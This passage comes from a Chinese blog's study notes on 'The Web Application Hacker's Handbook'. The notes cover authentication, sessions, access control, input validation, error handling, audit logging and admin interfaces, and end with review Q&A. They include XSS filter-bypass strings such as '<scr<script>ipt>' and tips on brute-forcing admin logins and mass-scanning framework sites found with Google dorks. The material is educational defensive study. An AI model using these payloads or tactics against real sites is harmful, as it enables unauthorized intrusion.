避免每个请求都要重新做身份验证，需要一个临时身份证，是服务器为用户颁发的，只能做临时身份验证，过期即失效</p></li><li><p>访问控制</p><p>  资源划分，只能访问自己的资源或所属用户组的资源，避免越权访问</p></li></ul><p>对用户访问的处理就是解决非授权访问和越权访问，不仅要阻止恶意用户偷偷跑进来，也要阻止普通用户访问其他用户或者管理员的资源。</p><blockquote><p>今日学习时间：2020/11/10 22:10-22:50，学习内容：web 实战 61-68 页，学习心得如下：</p></blockquote><h3 id="处理用户输入"><a href="#处理用户输入" class="headerlink" title="处理用户输入"></a>处理用户输入</h3><p>web 应用安全的核心问题是<strong>用户提交的数据不可信</strong>，对于用户或者攻击者提交的数据做处理，避免应用程序出现无法意料的情况。</p><h4 id="处理方法"><a href="#处理方法" class="headerlink" title="处理方法"></a>处理方法</h4><ul><li><p>黑名单</p><p>  对已知危险数据做处理，但是这种方法很可能被绕过，比如过滤文件后缀（php、php5、pht）</p></li><li><p>白名单</p><p>  只允许安全的数据</p></li><li><p>净化</p><p>  对危险数据做过滤或者进行编码</p></li><li><p>安全数据处理</p><p>  只能想到预编译了，可以避免闭合字符造成的 sql 注入</p></li><li><p>语法检查</p><p>  用合理的行为做不合理事，逻辑漏洞最为致命</p></li></ul><p>攻击方式多样也需要对提交数据做多样处理，一种处理机制很难处理多种攻击手段，比如针对 xss 做处理还要针对 sql 注入做处理。</p><p>安全边界，就是区分安全和不安全的界限。用户提交的数据不安全，经过服务器应用处理过的数据就算做安全，其实这样将不太准确。常常把内网和外网分为两个区域，内网是安全区域，外网是不安全区域，虽然内网被隔离，但是内网存在很大的安全隐患，一旦网络边界被突破，内网直接沦陷。内网安全现在已经被重视了，厂商也出了很多设备用来检测内网流量。</p><p>有点远了，对输入处理的安全边界确认更加细化，在内部处理过的数据也不能作为安全数据直接传递给下一个处理，要先经过安全检查后再传递，防止攻击者巧妙的利用 web 应用的处理程序生成恶意数据。还有就是对处理机制可能会有冲突，一个机制处理后的数据被下一个机制认为是恶意数据，书中提到赋予组件对恶意数据处理的能力，保证输入的数据没有可以被利用恶意数据，处理后交给下一个组件。有点绕了，总结一下，用户和服务之间存在安全边界，要经过处理后交给服务，服务内部有很多服务组件，交给服务组件时也要经过处理，组件处理后的结果再经过处理交给下一个组件，循环往复，保证输入输出都是安全数据。</p><p>针对可能安全处理有很多绕过方式，如果服务只对数据处理一次，就可以构造出被处理的数据依然可以执行的恶意数据，比如<code>&lt;scr&lt;script&gt;ipt&gt;</code>，程序过滤了<code>&lt;script&gt;</code>，过滤后的数据重新组成了<code>&lt;script&gt;</code>，多步确认要保证处理过的数据就是安全的。</p><p>规范化是指将数据转换或编码成常见字符集的过程。宽字节字节注入就是利用了中文字符集绕过过滤。针对规范化需要个人看法是统一一个环境，环境里只能有一种规范，进入环境就要先做规范化处理然后净化。</p><blockquote><p>今日学习时间：2020/11/11 20:10-21:00，学习内容：web 实战 69-73 页，学习心得如下：</p></blockquote><h3 id="处理攻击者"><a href="#处理攻击者" class="headerlink" title="处理攻击者"></a>处理攻击者</h3><p>将应用程序被攻击作为一个肯定的假设，其实能不能被攻击和应用的价值有很大关系，用户多业务重要的应用肯定被攻击的，自己写的小程序就自己用一般不会被攻击吧！！</p><ul><li><p>处理错误</p><p>  避免程序运行错误将错误信息直接返回，这样就暴漏了一些信息，还可能会被利用这些报错信息构造新的攻击手段。但是没有报错信息对于开发者就没办法调试程序，书中提到利用日志的方式，将错误信息记录方便对程序开发和维护。</p></li><li><p>维护审计日志</p><p>  将重要交互信息存储在日志里，如请求的 url、ip、时间等等，这些日志可以做为日后修复漏洞的信息还可以作为<strong>司法证据</strong>。对日志的保存要严格保存，避免未授权的读写，有效的保护方法就是将日志存放在仅能接受程序发送的更新信息的自治系统（在互联网中，一个自治系统(AS)是一个有权自主地决定在本系统中应采用何种路由协议的小型单位。）中，自治系统和应用程序之间的通信是单向的。</p></li><li><p>向管理员发出警告</p><p>  报警机制会有很多误报情况，需要制定可行的策略。</p><p>  对于逻辑漏洞，最有效的方法是将报警机制与应用程序的输入确认机制和其他控制方法紧密结合起来。避免越权访问。</p></li><li><p>应对攻击</p><p>  给攻击者设置更多的阻碍是一种有效的深层防御措施。</p></li></ul><blockquote><p>今日学习时间：2020/11/12 22:00-22:45，学习内容：web 实战 74-76 页，学习心得如下：</p></blockquote><h3 id="管理应用程序"><a href="#管理应用程序" class="headerlink" title="管理应用程序"></a>管理应用程序</h3><p>web 应用的管理程序就是指 web 后台，web 应用一般都有一个后台用来管理整个 web，比如论坛对帖子的审核就是靠后台操作的。对一个 web 应用做渗透时，一般都会用扫描器扫描 web 应用的目录，能够找到 web 的后台地址就很方便了。</p><p>web 后台的登录验证很多时候会比用户登录的验证要简单，很多都是默认密码或者没有类似验证码的验证机制，可以对后台做爆破。</p><ul><li>  后台验证机制薄弱</li><li>  对后台的访问没有做严格的访问控制，普通用户也可以登录后台</li><li>  后台存在严重漏洞，很多情况都是拿下 web 后台然后通过后台拿下服务器</li><li>  对后台的安全测试不严格</li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>使用相同框架写的 web 应用会有很大的潜在危险，一旦框架存在漏洞并被利用，所有使用该框架的 web 应有都可能会被拿下。一般都是利用谷歌语法找到使用某框架的 web 应用，然后批量扫描验证漏洞，这种方法很有针对性和准确性。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ol><li><p>为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？<br>典型的应用程序使用三重机制（身份验证、会话管理和访问控制）来处理访问。这些组件之间高度相互依赖，其中任何一个组件存在缺陷都会降低整个访问控制并访问其他机制的效率。例如，攻击者可以利用身份验证机制中的漏洞以任何用户身份登录，并因此获得未授权访问权限。如果能够预测令牌，攻击者就可以假冒成任何已登录用户们的数据。如果访问控制不完善，则任何用户都可以直接使用应该受到保护的功能。</p></li><li><p>会话与会话令牌有何不同？<br>会话是服务器上保存的一组数据结构，用于追踪用户与应用程序交互的状态。会话令牌是应用程序为会话分配的一个特殊字符串，用户需要在连接提出请求的过程中提交该字符串，以重新确认自己的身份。</p><blockquote><p>给一个人打电话，拨通号码，然后对方问你是谁，然后你说你是谁谁谁，然后对方提高到你的名字就知道你是谁了，你的名字就是会话令牌，会话就是整个打电话的过程。客户端与服务端的会话不会这么多废话，服务器只会记录关键信息，但是信息交互的过程还是会存在。</p></blockquote></li><li><p>为何不可能始终使用基于白名单的方法进行输入确认？<br>许多时候，应用程序可能会被迫接受与已知为“良性”输入的列表或模式不匹配的待处理数据。例如，许多用户的姓名包含可用在各种攻击中的字符。如果应用程序希望允许用户以真实姓名注册，就需要接受可能的恶意输入，并确保安全处理这些输入。</p><blockquote><p>业务需求对于开发才是第一，一个不安全的应用没人用，一个啥也干不了的应用也不会有人用，但是在使用者和开发者眼中，能不能用才是重要的，安不安全对他们就不太重要。</p></blockquote></li><li><p>攻击者正在攻击一个执行管理功能的应用程序，并且不具有使用这项功能的任何有效证书。为何他仍然应当密切关注这项功能呢？<br>攻击者可以利用任何访问控制核心机制中的缺陷未授权访问管理功能。此外，攻击者以低权限用户身份提交的数据最终将向管理用户显示，因此，攻击者可以提交一些恶意数据，用于在管理用户查看这些数据时攻破他们的会话，从而对管理用户实施攻击。</p></li><li><p>旨在阻止跨站点脚本攻击的输入确认机制按以下顺序处理一个输入：<br>(1) 删除任何出现的<code>&lt;script&gt;</code>表达式；</p><p> (2) 将输入截短为 50 个字符；</p><p> (3) 删除输入中的引号；</p><p> (4) 对输入进行 URL 解码；</p><p> (5) 如果任何输入项被删除，返回步骤(1)。<br> 是否能够避开上述确认机制，让以下数据通过确认？<br> <code> "&gt;&lt;script&gt;alert(“foo”)&lt;/script&gt;</code><br> 是。如果没有第 4 步，此机制将是可靠的，能够过滤其旨在阻止的特定项目。但是，由于输入在执行过滤步骤后被解码，攻击者只需要对有效载荷中的选定字符进行 URL 编码，就可以避开这种过滤：<code> "&gt;</code><br> 如果首先执行第 4 步，或根本不执行该步骤，攻击者将不可能避开上述过滤。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> booknote </category>
          
          <category> 《黑客攻防技术宝典（web实战篇）》 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
            <tag> 黑客攻防技术宝典（web实战篇） </tag>
            
            <tag> 信安之路 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
